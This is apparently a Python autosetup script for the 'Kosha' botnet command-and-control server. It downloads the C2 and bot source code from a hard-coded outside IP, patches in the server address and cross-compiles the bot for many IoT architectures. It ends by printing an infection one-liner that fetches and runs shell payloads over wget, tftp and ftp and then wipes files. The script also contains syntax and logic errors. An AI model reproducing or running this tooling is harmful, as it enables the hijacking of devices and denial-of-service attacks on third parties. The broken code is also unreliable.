# Kosha C2 Autosetup created by flexingonlamers / GeorgiaCri

import subprocess, time

def cri(cmd):
	subprocess.call(cmd, shell=True)
def jack(file_name, line_num, text):
  lines = open(file_name, 'r').readlines()
  lines[line_num] = text
  out = open(file_name, 'w')
  out.writelines(lines)
  out.close()

white "\x1b[1;37m"  
lred "\x1b[1;31m"    
lgreen "\x1b[1;32m"  
lyellow "\x1b[1;33m" 
lblue "\x1b[1;34m"   
lpurple "\x1b[38;5;196m" 
lcyan "\x1b[1;36m"   
dwhite "\x1b[0;37m"  
red "\x1b[0;31m"    
dgreen "\x1b[0;32m"  
dyellow "\x1b[0;33m" 
dblue "\x1b[0;34m"   
dpurple "\x1b[0;35m" 
dcyan "\x1b[0;36m"   

dependencies = raw_input(""+ white +"Would you like to install needed dependencies? ("+ lred +"y"+ white +"/"+ cyan +"n"+ white +"):"+ red +"")

if dependencies == "y" or "Y":
print(""+ white +"Installing Needed Dependencies and packages..")
time.sleep(2)
cri("yum update -y")
cri("yum install python-paramiko gcc screen nano wget httpd iptables perl -y")
cri("yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y")
cri("yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -")
cri("yum install epel-release -y")
cri("yum install gengetopt -y")
cri("yum install bzip2 -y")
cri("yum install lbzip2 -y")
print(""+ red +"Finished!")
time.sleep(2)
cri('clear')

elif dependencies == "n" or "N":
print(""+ white +"Bypassed!")

SIP = raw_input(""+ white +"Server IP:"+ red +"")
Username = raw_input(""+ white +"Username:"+ red +"")
Password = raw_input(""+ white +"Password:"+ red +"")
Plan = raw_input(""+ white +"User Plan (test/beginner/silver/gold/owner/kosha):"+ red +"")
BPort = raw_input(""+ white +"BotPort:"+ red +"")
threads = raw_input(""+ white +"Desired Threads to screen the c2 on:"+ red +"")
C2Port = raw_input(""+ white +"C2 Port:"+ red +"")
Bins = raw_input(""+ white +"Desired Bin Name:"+ red +"")
DIR = raw_input(""+ white +"Desired Directory to put bins in:"+ red +"")

print(""+ white +"Creating Admin Login for User:["+ red +""+ Username +""+ white +"] With Plan:["+ Plan +"]")
cri("echo "+ Username +" "+ Password +" admin "+ Plan +" >> login.txt")
print(""+ white +"Downloading the "+ red +"Kosha "+ white +"C2..")
time.sleep(2)
cri("wget -q http://98.143.148.177/kosha/kosha.c -O kosha.c")
print(""+ red +"Finished!")
print(""+ white +"Compiling "+ red +"Kosha"+ white +" C2..")
time.sleep(2)
cri('gcc -o kosha kosha.c -pthread && rm -rf kosha.c')
print(""+ red +"Finished!")
print(""+ white +"Downloading "+ red +"Kosha"+ white +" Bot..")
time.sleep(2)
cri("wget -q http://98.143.148.177/kosha/bot.c -O bot.c")
print(""+ red +"Finished!")
print(""+ white +"Downloading "+ red +"CrossCompiler"+ white +"!")
time.sleep(2)
cri("wget -q http://98.143.148.177/kosha/kosha.py -O kosha.py")
print(""+ red +"Finished!")
print(""+ white +"Changing "+ red +"IP"+ white +"and "+ red +"BotPort"+ white +" inside of "+ red +"Kosha "+ white +"bot!")
time.sleep(2)
jack('bot.c', '40', 'unsigned char *Demonserv[] = {"'+ SIP +':'+ BPort +'"};\n')
print(""+ red +"Finished!")
cri('clear')
print(""+ white +"Compiling Bot and Installing Cross-Compilers!")
time.sleep(2)
cri('python kosha.py bot.c '+ SIP +'')
print("Finished!")
print(""+ white +"Moving Cross-Compiler:["+ red +"MIPS"+ white +"] to "+ white +"/"+ red +"root"+ white +"/"+ red +"Cross-Compilers"+ white +"/")
cri("mv /root/cross-compiler-mips /root/Cross-Compilers/")
print(""+ white +"Moving Cross-Compiler:["+ red +"MIPSEL"+ white +"] to "+ white +"/"+ red +"root"+ white +"/"+ red +"Cross-Compilers"+ white +"/")
cri("mv /root/cross-compiler-mipsel /root/Cross-Compilers/")
print(""+ white +"Moving Cross-Compiler:["+ red +"POWERPC"+ white +"] to "+ white +"/"+ red +"root"+ white +"/"+ red +"Cross-Compilers"+ white +"/")
cri("mv /root/cross-compiler-powerpc /root/Cross-Compilers/")
print(""+ white +"Moving Cross-Compiler:["+ red +"ARMV52"+ white +"] to "+ white +"/"+ red +"root"+ white +"/"+ red +"Cross-Compilers"+ white +"/")
cri("mv /root/cross-compiler-armv5l /root/Cross-Compilers/")
print(""+ white +"Moving Cross-Compiler:["+ red +"ARMV61"+ white +"] to "+ white +"/"+ red +"root"+ white +"/"+ red +"Cross-Compilers"+ white +"/")
cri("mv /root/cross-compiler-armv6l /root/Cross-Compilers/")
print(""+ white +"Moving Cross-Compiler:["+ red +"POWERPC-440FP"+ white +"] to "+ white +"/"+ red +"root"+ white +"/"+ red +"Cross-Compilers"+ white +"/")
cri("mv /root/cross-compiler-powerpc-440fp /root/Cross-Compilers/")
print(""+ white +"Moving Cross-Compiler:["+ red +"I586"+ white +"] to "+ white +"/"+ red +"root"+ white +"/"+ red +"Cross-Compilers"+ white +"/")
cri("mv /root/cross-compiler-i586 /root/Cross-Compilers/")
print(""+ white +"Moving Cross-Compiler:["+ red +"SH4"+ white +"] to "+ white +"/"+ red +"root"+ white +"/"+ red +"Cross-Compilers"+ white +"/")
cri("mv /root/cross-compiler-sh4 /root/Cross-Compilers/")
print(""+ white +"Moving Cross-Compiler:["+ red +"I686"+ white +"] to "+ white +"/"+ red +"root"+ white +"/"+ red +"Cross-Compilers"+ white +"/")
cri("mv /root/cross-compiler-i686 /root/Cross-Compilers/")
print(""+ white +"Moving Cross-Compiler:["+ red +"SPARC"+ white +"] to "+ white +"/"+ red +"root"+ white +"/"+ red +"Cross-Compilers"+ white +"/")
cri("mv /root/cross-compiler-sparc /root/Cross-Compilers/")
print(""+ white +"Moving Cross-Compiler:["+ red +"M68K"+ white +"] to "+ white +"/"+ red +"root"+ white +"/"+ red +"Cross-Compilers"+ white +"/")
cri("mv /root/cross-compiler-m68k /root/Cross-Compilers/")
print(""+ white +"Moving Cross-Compiler:["+ red +"x86_64"+ white +"] to "+ white +"/"+ red +"root"+ white +"/"+ red +"Cross-Compilers"+ white +"/")
cri("mv /root/cross-compiler-x86_64 /root/Cross-Compilers/")
print(""+ white +"Moving Cross-Compiler:["+ red +"ARMV41"+ white +"] to "+ white +"/"+ red +"root"+ white +"/"+ red +"Cross-Compilers"+ white +"/")
cri("mv /root/cross-compiler-armv4l /root/Cross-Compilers/")
print(""+ red +"Finished!")
print(""+ white +"Changing Bin Names!")
cri('cd var/www/html/ && cat bins.sh >> '+ bins +'; rm -rf bins.sh && mv /var/www/html/'+ bins +'.sh /var/www/html/'+ DIR +'')
print(""+ red +"Finished!")
print(""+ white +"Now setting up HTML Directory for protection!")
cri("cd /var/www/html && mkdir assets; cd assets && wget http://98.143.148.177/assets/favicon-globe.ico && wget http://98.143.148.177/assets/main.css && wget http://98.143.148.177/assets/sound.js && wget http://98.143.148.177/assets/stars.css && cd .. && wget -q http://98.143.148.177/el.html -O index.html && wget http://98.143.148.177/botnet.mp3 && cd")
print(""+ red +"Finished!")
print(""+ white +"Now Screening the c2..")
cri('screen -s ./kosha '+ BPort +' '+ threads +' '+ C2Port +'')
print(""+ red +"Finished!")
cri('clear')
print(""+ white +"WGET/Charline printed below!")
print('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://'+ SIP +'/'+ DIR +'/'+ Bins +'.sh; chmod 777 '+ Bins +'.sh; sh '+ Bins +'sh; tftp '+ SIP +' -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g '+ SIP +'; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 '+ SIP +' ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf '+ Bins +'.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *')